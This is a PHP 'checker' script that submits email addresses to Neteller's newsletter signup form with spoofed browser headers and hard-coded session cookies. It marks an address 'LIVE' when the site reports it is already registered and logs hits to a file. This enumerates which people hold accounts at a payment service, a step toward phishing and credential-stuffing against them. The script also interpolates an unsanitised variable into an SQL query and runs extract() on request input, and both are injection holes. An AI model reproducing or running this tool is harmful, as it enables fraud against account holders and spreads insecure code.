<?php
/**
 * @author: PiraTos S-Tn
 * @mail: cpamt00l@gmail.com
*/
$fp = fopen("valid.txt","a");
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
session_start();
error_reporting(0); 
$chkemail = strip_tags($_GET['chkemail']);

    if ($chkemail == undefined || $chkemail == null) {
    $chkemail = "Sorry Email not Given";
    $data=array('error_code' => 209, 'email' => $chkemail, 'status' => 'invalid');
    echo json_encode($data);
    exit();
    break;
}
    if (!preg_match("/^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,10})$/", $chkemail)) {
                    $chkemail = "Your Email Address format wrong";
    $data=array('error_code' => 209, 'email' => $chkemail, 'status' => 'invalid');
    echo json_encode($data);
                return $data;
            }
?>


<?php 
$chkemail = strip_tags($_GET['chkemail']);
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

function get_string_between($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return substr($string, $ini, $len);
}

// Login process



set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Sao_Paulo');
extract($_GET);
$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, "https://news.neteller.com/pub/rf");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "LANG_LOCALE=EN&EMAIL_ADDRESS_=".strip_tags($chkemail)."&submit=SIGN+UP+NOW&CAMPAIGN_=GMP_SIGNUP_MODULE_1A&charset_=UTF-8&_Sent_=2018-11-14+02%3A56%3A32.516&_LID_=34156622&LANGUAGE=&_ri_=X0Gzc2X%253DYQpglLjHJlTQGnzdg19GDBr4LbvW2y5tgnNRzfamFwtf6dXa7OtJkWVwjpnpgHlpgneHmgJoXX0Gzc2X%253DYQpglLjHJlTQGr1DvC4UUlkzg3eLfEzg1AO4OzfamFwtf6dXa7OtJkW&_ei_=EvHfoydLcmUKBW4puJsw7QA&__HIDDEN_FIELD_NAMES__=CAMPAIGN_%3Bcharset_%3B_Sent_%3B_LID_%3BLANGUAGE%3B_ri_%3B_ei_%3B__HIDDEN_FIELD_NAMES__");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 3);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
$headers = array();
$headers[] = "Connection: keep-alive";
$headers[] = "Cache-Control: max-age=0";
$headers[] = "Origin: https://news.neteller.com";
$headers[] = "Upgrade-Insecure-Requests: 1";
$headers[] = "Content-Type: application/x-www-form-urlencoded";
$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36";
$headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8";
$headers[] = "Referer: https://news.neteller.com/pub/sf/FormLink?_ri_=X0Gzc2X%3DYQpglLjHJlTQGjDRNcpgrzgkKnI55tFOqsDhzfamFwtf6dXa7OtJkWVXMtX%3DYQpglLjHJlTQGnzdg19GDBr4LbvW2y5tgnNRzfamFwtf6dXa7OtJkW&_ei_=EmlgFnyY8oOnf_8eo3fR03Q";
$headers[] = "Accept-Encoding: gzip, deflate, br";
$headers[] = "Accept-Language: en-US,en;q=0.9";
$headers[] = "Cookie: check=true; _gcl_au=1.1.184095415.1542183569; _ga=GA1.2.213221424.1542183570; _gid=GA1.2.1977650567.1542183570; _msuuid_50717zgb61570=FD785B87-07D5-4CA6-9660-2845F4E97C7B; _fbp=fb.1.1542183570362.1202596414; cookie-accepted=true; memDeviceId=b546b636-2ee8-4220-be13-fbfdf8785c5a.42a1bb006ce8af681a20267323210549cb0f30f5a52777245e2471ef760753e02d6e135988cfe2f0c052843ac416250da524957ef9d54ed3f23d6f1ecd13e6d4; NTLOCALELANGUAGE=ar; NT_CO_BRAND_NAME=false; NTLOCALECOUNTRY=EG; Acct_ID=458725791375; NT_MEMBER_CATEGORY=false; tmSessionId=20181114085452_746_4e0a50fc-8b2c-4a0c-b480-d6177b35aa97; TS01285995=0184fa3e0ac321d88a9c626a9d9c8b31023807ed85c62622d1e59f6c0dfa7fc71a91594ad33249820adf279fa75745a8239a2bd7cad7df9a4ef4e57cf4357052d862170bd538dae8598ee94083326b4ef2630ea65517cf1403beef47066590d442412284c805e552dfe6fbfd2a2b0443d6eb0e0b73ac0f0036148668f9642a5a31ba06879a7efcf74e5d2ae6cabbf0fad63c739cb8b607fd3c2ffae0dee037a3a48a952ad4; mbox=PC#530dfada45fd4cfa95fda0332db4a48a.26_8#1605430877|session#5bd04d069f5740de89ea059ccc2e15cc#1542194974; _gat_UA-39489651-16=1";
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
curl_close($ch);
ob_flush();



if (strpos($result, 'THANKS FOR SIGNING UP!') !== false) {

    $data=array('error_code' => 209, 'email' => strip_tags($chkemail), 'status' => 'invalid');
    echo json_encode($data);
    exit();
}if (strpos($result, 'Please select your country below') !== false) {
    $data=array('error_code' => 209, 'email' => strip_tags($chkemail), 'status' => 'invalid');
    echo json_encode($data);
    exit();
}elseif (strpos($result, 'ALREADY') !== false) {
        mysql_query("UPDATE `user` SET `credits`=credits-1 WHERE email='$email'");
    $data=array('error_code' => 0, 'email' => strip_tags($chkemail), 'status' => 'live');
    echo json_encode($data);
      fwrite($fp,"LIVE NETELLER => $chkemail\r\n");
    exit();
}else{
    $chkemail = "Unable to check Please contact Admin";
    $data=array('error_code' => 209, 'email' => strip_tags($chkemail), 'status' => 'invalid');
    echo json_encode($data);
    exit();
}
//echo $result;
?>